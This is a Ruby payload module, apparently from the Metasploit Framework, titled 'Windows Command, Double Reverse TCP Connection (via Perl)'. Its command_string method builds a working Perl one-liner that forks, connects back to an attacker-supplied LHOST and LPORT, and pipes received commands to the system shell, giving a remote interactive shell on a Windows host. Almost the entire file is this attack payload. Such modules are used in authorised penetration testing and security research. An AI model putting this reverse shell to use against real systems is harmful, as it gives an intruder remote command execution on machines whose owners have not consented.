##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 148

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Command, Double Reverse TCP Connection (via Perl)',
      'Description'   => 'Creates an interactive shell via perl',
      'Author'        => ['cazz', 'aushack'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'perl',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    lhost = datastore['LHOST']
    ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    cmd   = %{perl -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\\"#{lhost}:#{datastore['LPORT']}\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"}
  end
end
